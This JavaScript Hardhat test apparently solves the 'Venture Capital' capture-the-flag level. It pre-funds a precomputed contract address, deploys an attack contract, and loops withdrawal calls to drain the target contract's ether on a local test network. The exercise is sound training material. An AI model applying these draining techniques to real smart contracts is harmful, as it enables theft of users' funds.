const { ethers } = require("hardhat");
const hre = require('hardhat');

// https://github.com/cypherpunks-core/cypherpunks-ctf/blob/dev/contracts/levels/VentureCapitalFactory.sol

// Approach 1: send ether to the pre-computed address that DeveloperAuthorizer is about to be deployed
// Approach 2: kill the contract and re-deploy using CREATE2: https://hackernoon.com/using-ethereums-create2-nw2137q7
describe("Venture Capital", function () {
  it("Approach 1", async function () {
    const provider = hre.network.provider;
    const [player, deployer, client] = await hre.ethers.getSigners();

    // const delpoyerNonce = await deployer.getTransactionCount();
    // console.log('delpoyerNonce', delpoyerNonce.toString(16));
    const preComputedVCAddr = ethers.utils.getContractAddress({
        from: deployer.address,
        nonce: await deployer.getTransactionCount()
    });
    console.log('preComputedVCAddr:', preComputedVCAddr);

    const preComputedDAAddr = ethers.utils.getContractAddress({
        from: preComputedVCAddr,
        nonce: 1
    });
    console.log('preComputedDAAddr:', preComputedDAAddr);

    player.sendTransaction({
        from: player.address,
        to: preComputedDAAddr,
        value: ethers.utils.parseEther('0.424242')
    });

    const VCFactory = await ethers.getContractFactory("VentureCapital");
    const vc = await VCFactory.connect(deployer).deploy({ value: ethers.utils.parseEther('1.0') });
    await vc.deployed();

    console.log('vc address', vc.address);

    const da = await ethers.getContractAt(
        require('../artifacts/contracts/VentureCapital.sol/DeveloperAuthorizer.json').abi,
        await vc.developerAuthorizer(),
        deployer
    );

    console.log('player.address:', player.address);
    console.log('owner.address:', await vc.owner());
    console.log('manager:', await vc.manager());

    console.log('vc balance: ', await provider.send('eth_getBalance', [vc.address]));
    console.log('da balance: ', await provider.send('eth_getBalance', [da.address]));
    console.log('vc client balance:', await vc.clientBalance());

    console.log('da address:', da.address);
    console.log('vc.developerAuthorizer():', await vc.developerAuthorizer());
    console.log('da.developerMode:', await da.developerMode());

    // console.log('da.developerMode:', await da.developerMode());

    // const managementEnableTx = await vc.connect(player).managementEnable(player.address);
    // await managementEnableTx.wait();
    console.log('vc client balance:', await vc.clientBalance());
    console.log('vc balance: ', await provider.send('eth_getBalance', [vc.address]));

    // const newClientTx = await vc.connect(player).newClient(client.address, 18, { value: 2 });
    // await newClientTx.wait();

    console.log('vc client balance:', await vc.clientBalance());
    console.log('the client balance:', await provider.send('eth_getBalance', [client.address]));
    console.log('vc balance: ', await provider.send('eth_getBalance', [vc.address]));

    const byeClientTx = await vc.connect(player).byeClient();
    await byeClientTx.wait();

    console.log('vc client balance:', await vc.clientBalance());
    console.log('the client balance:', await provider.send('eth_getBalance', [client.address]));
    console.log('vc balance: ', parseInt(await provider.send('eth_getBalance', [vc.address])));

    const VCAFactory = await ethers.getContractFactory("VentureCapitalAttack");
    const vca = await VCAFactory.connect(player).deploy(vc.address);
    await vca.deployed();

    console.log('vc address', vca.address);

    const newClientTx = await vc.connect(player).newClient(vca.address, 18, { value: 100 });
    await newClientTx.wait();

    for (let i = 0; i < 1e16; i++) {
        const clientWithdrawTx = await vc.connect(player).clientWithdraw(vca.address);
        await clientWithdrawTx.wait();

        console.log('vc balance: ', parseInt(await provider.send('eth_getBalance', [vc.address])));
        console.log('vca balance:', parseInt(await provider.send('eth_getBalance', [vca.address])));
    }

  });
});
